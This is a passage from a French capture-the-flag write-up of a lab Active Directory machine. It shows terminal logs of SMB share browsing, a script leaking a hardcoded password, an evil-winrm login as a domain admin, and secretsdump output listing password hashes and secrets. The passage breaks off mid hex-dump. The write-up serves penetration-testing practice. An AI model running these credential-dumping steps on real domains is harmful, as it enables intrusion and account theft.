<p>Les autre partages sont des partages par défaut de Windows.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 12:18:05 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># smbclient \\\\10.10.211.33\\SYSVOL -U &#39;enterprise-core-vn%ry=ibfkfv,s6h,&#39;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  .                                   D        <span class="m">0</span>  Thu Mar <span class="m">11</span> 19:19:49 <span class="m">2021</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  ..                                  D        <span class="m">0</span>  Thu Mar <span class="m">11</span> 19:19:49 <span class="m">2021</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  vulnnet-rst.local                  Dr        <span class="m">0</span>  Thu Mar <span class="m">11</span> 19:19:49 <span class="m">2021</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">		<span class="m">8771839</span> blocks of size 4096. <span class="m">4553871</span> blocks available
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">smb: <span class="se">\&gt;</span> <span class="nb">cd</span> vulnnet-rst.local<span class="se">\
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="se"></span>smb: <span class="se">\v</span>ulnnet-rst.local<span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="ln">11</span><span class="cl">  .                                   D        <span class="m">0</span>  Thu Mar <span class="m">11</span> 19:23:40 <span class="m">2021</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  ..                                  D        <span class="m">0</span>  Thu Mar <span class="m">11</span> 19:23:40 <span class="m">2021</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">  DfsrPrivate                      DHSr        <span class="m">0</span>  Thu Mar <span class="m">11</span> 19:23:40 <span class="m">2021</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">  Policies                            D        <span class="m">0</span>  Thu Mar <span class="m">11</span> 19:20:26 <span class="m">2021</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">  scripts                             D        <span class="m">0</span>  Tue Mar <span class="m">16</span> 23:15:49 <span class="m">2021</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl">		<span class="m">8771839</span> blocks of size 4096. <span class="m">4553871</span> blocks available
</span></span><span class="line"><span class="ln">18</span><span class="cl">smb: <span class="se">\v</span>ulnnet-rst.local<span class="se">\&gt;</span> <span class="nb">cd</span> scripts<span class="se">\
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="se"></span>smb: <span class="se">\v</span>ulnnet-rst.local<span class="se">\s</span>cripts<span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="ln">20</span><span class="cl">  .                                   D        <span class="m">0</span>  Tue Mar <span class="m">16</span> 23:15:49 <span class="m">2021</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">  ..                                  D        <span class="m">0</span>  Tue Mar <span class="m">16</span> 23:15:49 <span class="m">2021</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">  ResetPassword.vbs                   A     <span class="m">2821</span>  Tue Mar <span class="m">16</span> 23:18:14 <span class="m">2021</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">		<span class="m">8771839</span> blocks of size 4096. <span class="m">4553871</span> blocks available
</span></span><span class="line"><span class="ln">25</span><span class="cl">smb: <span class="se">\v</span>ulnnet-rst.local<span class="se">\s</span>cripts<span class="se">\&gt;</span> wget ResetPassword.vbs
</span></span><span class="line"><span class="ln">26</span><span class="cl">wget: <span class="nb">command</span> not found
</span></span><span class="line"><span class="ln">27</span><span class="cl">smb: <span class="se">\v</span>ulnnet-rst.local<span class="se">\s</span>cripts<span class="se">\&gt;</span> get ResetPassword.vbs
</span></span><span class="line"><span class="ln">28</span><span class="cl">getting file <span class="se">\v</span>ulnnet-rst.local<span class="se">\s</span>cripts<span class="se">\R</span>esetPassword.vbs of size <span class="m">2821</span> as ResetPassword.vbs <span class="o">(</span>0.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.3 KiloBytes/sec<span class="o">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">smb: <span class="se">\v</span>ulnnet-rst.local<span class="se">\s</span>cripts<span class="se">\&gt;</span> <span class="nb">exit</span>
</span></span></code></pre></div><p>On a récupéré le script <strong>ResetPassword.vbs</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">    <span class="o">[</span>May 12, <span class="m">2024</span> - 12:20:21 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># cat ResetPassword.vbs</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Option Explicit
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Dim strUserDN, objUser, strPassword, strUserNTName
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="s1">&#39; Constants for the NameTranslate object.
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="s1">Const ADS_NAME_INITTYPE_GC = 3
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="s1">Const ADS_NAME_TYPE_NT4 = 3
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="s1">Const ADS_NAME_TYPE_1779 = 1
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="s1">If (Wscript.Arguments.Count &lt;&gt; 0) Then
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="s1">    Wscript.Echo &#34;Syntax Error. Correct syntax is:&#34;
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="s1">    Wscript.Echo &#34;cscript ResetPassword.vbs&#34;
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="s1">    Wscript.Quit
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="s1">End If
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="s1">strUserNTName = &#34;a-whitehat&#34;
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="s1">strPassword = &#34;bNdKVkjv3RR9ht&#34;
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="s1">&#39;</span> Determine DNS domain name from RootDSE object.
</span></span><span class="line"><span class="ln">22</span><span class="cl">Set <span class="nv">objRootDSE</span> <span class="o">=</span> GetObject<span class="o">(</span><span class="s2">&#34;LDAP://RootDSE&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nv">strDNSDomain</span> <span class="o">=</span> objRootDSE.Get<span class="o">(</span><span class="s2">&#34;defaultNamingContext&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="s1">&#39; Use the NameTranslate object to find the NetBIOS domain name from the
</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="s1">&#39;</span> DNS domain name.
</span></span><span class="line"><span class="ln">27</span><span class="cl">Set <span class="nv">objTrans</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&#34;NameTranslate&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">objTrans.Init ADS_NAME_INITTYPE_GC, <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="nv">strNetBIOSDomain</span> <span class="o">=</span> objTrans.Get<span class="o">(</span>ADS_NAME_TYPE_NT4<span class="o">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="s1">&#39; Remove trailing backslash.
</span></span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="s1">strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)
</span></span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="s1">&#39;</span> Use the NameTranslate object to convert the NT user name to the
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="s1">&#39; Distinguished Name required for the LDAP provider.
</span></span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="s1">On Error Resume Next
</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="s1">objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain &amp; &#34;\&#34; &amp; strUserNTName
</span></span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="s1">If (Err.Number &lt;&gt; 0) Then
</span></span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="s1">    On Error GoTo 0
</span></span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="s1">    Wscript.Echo &#34;User &#34; &amp; strUserNTName _
</span></span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="s1">        &amp; &#34; not found in Active Directory&#34;
</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="s1">    Wscript.Echo &#34;Program aborted&#34;
</span></span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="s1">    Wscript.Quit
</span></span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="s1">End If
</span></span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="s1">strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
</span></span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="s1">&#39;</span> Escape any forward slash characters, <span class="s2">&#34;/&#34;</span>, with the backslash
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="s1">&#39; escape character. All other characters that should be escaped are.
</span></span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="s1">strUserDN = Replace(strUserDN, &#34;/&#34;, &#34;\/&#34;)
</span></span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="s1">&#39;</span> Bind to the user object in Active Directory with the LDAP provider.
</span></span><span class="line"><span class="ln">51</span><span class="cl">On Error Resume Next
</span></span><span class="line"><span class="ln">52</span><span class="cl">Set <span class="nv">objUser</span> <span class="o">=</span> GetObject<span class="o">(</span><span class="s2">&#34;LDAP://&#34;</span> <span class="p">&amp;</span> strUserDN<span class="o">)</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">If <span class="o">(</span>Err.Number &lt;&gt; 0<span class="o">)</span> Then
</span></span><span class="line"><span class="ln">54</span><span class="cl">    On Error GoTo <span class="m">0</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">    Wscript.Echo <span class="s2">&#34;User &#34;</span> <span class="p">&amp;</span> strUserNTName _
</span></span><span class="line"><span class="ln">56</span><span class="cl">        <span class="p">&amp;</span> <span class="s2">&#34; not found in Active Directory&#34;</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">    Wscript.Echo <span class="s2">&#34;Program aborted&#34;</span>
</span></span><span class="line"><span class="ln">58</span><span class="cl">    Wscript.Quit
</span></span><span class="line"><span class="ln">59</span><span class="cl">End If
</span></span><span class="line"><span class="ln">60</span><span class="cl">objUser.SetPassword strPassword
</span></span><span class="line"><span class="ln">61</span><span class="cl">If <span class="o">(</span>Err.Number &lt;&gt; 0<span class="o">)</span> Then
</span></span><span class="line"><span class="ln">62</span><span class="cl">    On Error GoTo <span class="m">0</span>
</span></span><span class="line"><span class="ln">63</span><span class="cl">    Wscript.Echo <span class="s2">&#34;Password NOT reset for &#34;</span> <span class="p">&amp;</span>vbCrLf <span class="p">&amp;</span> strUserNTName
</span></span><span class="line"><span class="ln">64</span><span class="cl">    Wscript.Echo <span class="s2">&#34;Password &#34;</span> <span class="p">&amp;</span> strPassword <span class="p">&amp;</span> <span class="s2">&#34; may not be allowed, or&#34;</span>
</span></span><span class="line"><span class="ln">65</span><span class="cl">    Wscript.Echo <span class="s2">&#34;this client may not support a SSL connection.&#34;</span>
</span></span><span class="line"><span class="ln">66</span><span class="cl">    Wscript.Echo <span class="s2">&#34;Program aborted&#34;</span>
</span></span><span class="line"><span class="ln">67</span><span class="cl">    Wscript.Quit
</span></span><span class="line"><span class="ln">68</span><span class="cl">Else
</span></span><span class="line"><span class="ln">69</span><span class="cl">    objUser.AccountDisabled <span class="o">=</span> False
</span></span><span class="line"><span class="ln">70</span><span class="cl">    objUser.Put <span class="s2">&#34;pwdLastSet&#34;</span>, <span class="m">0</span>
</span></span><span class="line"><span class="ln">71</span><span class="cl">    Err.Clear
</span></span><span class="line"><span class="ln">72</span><span class="cl">    objUser.SetInfo
</span></span><span class="line"><span class="ln">73</span><span class="cl">    If <span class="o">(</span>Err.Number &lt;&gt; 0<span class="o">)</span> Then
</span></span><span class="line"><span class="ln">74</span><span class="cl">        On Error GoTo <span class="m">0</span>
</span></span><span class="line"><span class="ln">75</span><span class="cl">        Wscript.Echo <span class="s2">&#34;Password reset for &#34;</span> <span class="p">&amp;</span> strUserNTName
</span></span><span class="line"><span class="ln">76</span><span class="cl">        Wscript.Echo <span class="s2">&#34;But, unable to enable account or expire password&#34;</span>
</span></span><span class="line"><span class="ln">77</span><span class="cl">        Wscript.Quit
</span></span><span class="line"><span class="ln">78</span><span class="cl">    End If
</span></span><span class="line"><span class="ln">79</span><span class="cl">End If
</span></span><span class="line"><span class="ln">80</span><span class="cl">On Error GoTo <span class="m">0</span>
</span></span><span class="line"><span class="ln">81</span><span class="cl">
</span></span><span class="line"><span class="ln">82</span><span class="cl">Wscript.Echo <span class="s2">&#34;Password reset, account enabled,&#34;</span>
</span></span><span class="line"><span class="ln">83</span><span class="cl">Wscript.Echo <span class="s2">&#34;and password expired for user &#34;</span> <span class="p">&amp;</span> strUserNTName#
</span></span></code></pre></div><p>HOP ! On a des credentials:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl"><span class="nv">strUserNTName</span> <span class="o">=</span> <span class="s2">&#34;a-whitehat&#34;</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nv">strPassword</span> <span class="o">=</span> <span class="s2">&#34;bNdKVkjv3RR9ht&#34;</span>
</span></span></code></pre></div>
<h4 id="privesc" data-numberify>privesc<a class="anchor ms-1" href="#privesc"></a></h4>
<p>On peut maintenant se connecter à la machine avec Evil-WinRM:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 12:24:24 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># evil-winrm -i 10.10.211.33 -u &#39;a-whitehat&#39; -p &#39;bNdKVkjv3RR9ht&#39;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Evil-WinRM shell v3.5
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>-whitehat<span class="se">\D</span>ocuments&gt; dir
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>-whitehat<span class="se">\D</span>ocuments&gt; whoami /all
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">USER INFORMATION
</span></span><span class="line"><span class="ln">11</span><span class="cl">----------------
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">User Name              <span class="nv">SID</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="o">======================</span> <span class="o">=============================================</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">vulnnet-rst<span class="se">\a</span>-whitehat S-1-5-21-1589833671-435344116-4136949213-1105
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">GROUP INFORMATION
</span></span><span class="line"><span class="ln">19</span><span class="cl">-----------------
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">Group Name                                         Type             SID                                          <span class="nv">Attributes</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="o">==================================================</span> <span class="o">================</span> <span class="o">============================================</span> <span class="o">===============================================================</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="ln">24</span><span class="cl">BUILTIN<span class="se">\U</span>sers                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="ln">25</span><span class="cl">BUILTIN<span class="se">\P</span>re-Windows <span class="m">2000</span> Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="ln">26</span><span class="cl">BUILTIN<span class="se">\A</span>dministrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
</span></span><span class="line"><span class="ln">27</span><span class="cl">NT AUTHORITY<span class="se">\N</span>ETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="ln">28</span><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="ln">29</span><span class="cl">NT AUTHORITY<span class="se">\T</span>his Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="ln">30</span><span class="cl">VULNNET-RST<span class="se">\D</span>omain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="ln">31</span><span class="cl">VULNNET-RST<span class="se">\D</span>enied RODC Password Replication Group Alias            S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group
</span></span><span class="line"><span class="ln">32</span><span class="cl">NT AUTHORITY<span class="se">\N</span>TLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="ln">33</span><span class="cl">Mandatory Label<span class="se">\H</span>igh Mandatory Level               Label            S-1-16-12288
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">
</span></span><span class="line"><span class="ln">36</span><span class="cl">PRIVILEGES INFORMATION
</span></span><span class="line"><span class="ln">37</span><span class="cl">----------------------
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl">Privilege Name                            Description                                                        <span class="nv">State</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="o">=========================================</span> <span class="o">==================================================================</span> <span class="o">=======</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="k">for</span> a process                                 Enabled
</span></span><span class="line"><span class="ln">42</span><span class="cl">SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
</span></span><span class="line"><span class="ln">43</span><span class="cl">SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
</span></span><span class="line"><span class="ln">44</span><span class="cl">SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
</span></span><span class="line"><span class="ln">45</span><span class="cl">SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
</span></span><span class="line"><span class="ln">46</span><span class="cl">SeSystemProfilePrivilege                  Profile system performance                                         Enabled
</span></span><span class="line"><span class="ln">47</span><span class="cl">SeSystemtimePrivilege                     Change the system <span class="nb">time</span>                                             Enabled
</span></span><span class="line"><span class="ln">48</span><span class="cl">SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
</span></span><span class="line"><span class="ln">49</span><span class="cl">SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
</span></span><span class="line"><span class="ln">50</span><span class="cl">SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
</span></span><span class="line"><span class="ln">51</span><span class="cl">SeBackupPrivilege                         Back up files and directories                                      Enabled
</span></span><span class="line"><span class="ln">52</span><span class="cl">SeRestorePrivilege                        Restore files and directories                                      Enabled
</span></span><span class="line"><span class="ln">53</span><span class="cl">SeShutdownPrivilege                       Shut down the system                                               Enabled
</span></span><span class="line"><span class="ln">54</span><span class="cl">SeDebugPrivilege                          Debug programs                                                     Enabled
</span></span><span class="line"><span class="ln">55</span><span class="cl">SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
</span></span><span class="line"><span class="ln">56</span><span class="cl">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
</span></span><span class="line"><span class="ln">57</span><span class="cl">SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
</span></span><span class="line"><span class="ln">58</span><span class="cl">SeUndockPrivilege                         Remove computer from docking station                               Enabled
</span></span><span class="line"><span class="ln">59</span><span class="cl">SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted <span class="k">for</span> delegation     Enabled
</span></span><span class="line"><span class="ln">60</span><span class="cl">SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
</span></span><span class="line"><span class="ln">61</span><span class="cl">SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
</span></span><span class="line"><span class="ln">62</span><span class="cl">SeCreateGlobalPrivilege                   Create global objects                                              Enabled
</span></span><span class="line"><span class="ln">63</span><span class="cl">SeIncreaseWorkingSetPrivilege             Increase a process working <span class="nb">set</span>                                     Enabled
</span></span><span class="line"><span class="ln">64</span><span class="cl">SeTimeZonePrivilege                       Change the <span class="nb">time</span> zone                                               Enabled
</span></span><span class="line"><span class="ln">65</span><span class="cl">SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
</span></span><span class="line"><span class="ln">66</span><span class="cl">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="k">for</span> another user in the same session Enabled
</span></span><span class="line"><span class="ln">67</span><span class="cl">
</span></span><span class="line"><span class="ln">68</span><span class="cl">
</span></span><span class="line"><span class="ln">69</span><span class="cl">USER CLAIMS INFORMATION
</span></span><span class="line"><span class="ln">70</span><span class="cl">-----------------------
</span></span><span class="line"><span class="ln">71</span><span class="cl">
</span></span><span class="line"><span class="ln">72</span><span class="cl">User claims unknown.
</span></span><span class="line"><span class="ln">73</span><span class="cl">
</span></span><span class="line"><span class="ln">74</span><span class="cl">Kerberos support <span class="k">for</span> Dynamic Access Control on this device has been disabled.
</span></span></code></pre></div><p>Ici on a des informations intéressantes:</p>
<ul>
<li><strong>VULNNET-RST\Domain Admins</strong></li>
</ul>
<p>Une fois que l&rsquo;on a ça on peut penser a faire un secretsdump</p>

<h4 id="secretsdump" data-numberify>secretsdump<a class="anchor ms-1" href="#secretsdump"></a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 12:28:48 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># secretsdump VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.211.33</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Impacket <span class="k">for</span> Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright <span class="m">2022</span> Fortra - forked by ThePorgs
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Service RemoteRegistry is in stopped state
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service RemoteRegistry
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping <span class="nb">local</span> SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class="line"><span class="ln">10</span><span class="cl">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> SAM hashes extraction <span class="k">for</span> user WDAGUtilityAccount failed. The account doesn<span class="err">&#39;</span>t have <span class="nb">hash</span> information.
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping cached domain logon information <span class="o">(</span>domain/username:hash<span class="o">)</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping LSA Secrets
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="nv">$MACHINE</span>.ACC
</span></span><span class="line"><span class="ln">15</span><span class="cl">VULNNET-RST<span class="se">\W</span>IN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:d1cf5bd71959114ef8a147a565ae44490134863025a53ea637e5005ea0f8e2da
</span></span><span class="line"><span class="ln">16</span><span class="cl">VULNNET-RST<span class="se">\W</span>IN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:475c9d59b8f1d616ccb630e93ae31fc0
</span></span><span class="line"><span class="ln">17</span><span class="cl">VULNNET-RST<span class="se">\W</span>IN-2BO8M1OE1M1$:des-cbc-md5:e32f734cda85a7ea
</span></span><span class="line"><span class="ln">18</span><span class="cl">VULNNET-RST<span class="se">\W</span>IN-2BO8M1OE1M1$:plain_password_hex:63edeac7b7c3c8e4fdf2b0731130beeb27815486e1afe3a870b55e7ec03efe78f9c63885fe1511b2cbe66b5c93abd83bc084c3cfb725d6e6c4a08de89a2a821b182b87880d9c7c62f7bc8c183f200345c06155413f2268def9fe3b02eeb639b77a375356316ead43330ece1a33e9866f2998bf1fca8c56c0caa0656c863996aaf41eed3de33de526e90340e2ff85ad774189857528cc1281c31519c28318c3541a306ecb034631d5b9491ba2e35858c023e4e68af1c7f198e36400bd988f097bbaf069307c6842274a50f1ab8815dc12ea1b7637d684e90e470d1f7c69712e77050cda0bf34b3bce2a3c9a590da9bb7e
</span></span><span class="line"><span class="ln">19</span><span class="cl">VULNNET-RST<span class="se">\W</span>IN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:b53e5ad16472b47f8fb7292cc3f1f55a:::
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> DPAPI_SYSTEM
</span></span><span class="line"><span class="ln">21</span><span class="cl">dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419
</span></span><span class="line"><span class="ln">22</span><span class="cl">dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> NL<span class="nv">$KM</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"> <span class="m">0000</span>   F3 F6 6B 8D 1E 2A F4 8E  <span class="m">85</span> F6 7A <span class="m">46</span> D1 <span class="m">25</span> A0 D3   ..k..*....zF.%..
</span></span><span class="line"><span class="ln">25</span><span class="cl"> <span class="m">0010</span>   EA F4 <span class="m">90</span> 7D 2D CB A5 8C  <span class="m">88</span> C5 <span class="m">68</span> 4C 1E D3 <span class="m">67</span> 3B   ...<span class="o">}</span>-.....hL..g<span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"> <span class="m">0020</span>   DB <span class="m">31</span> D9 <span class="m">91</span> C9 BB 6A <span class="m">57</span>  EA <span class="m">18</span> 2C <span class="m">90</span> D3 <span class="m">06</span> F8 <span class="m">31</span>   .1....jW..,....1
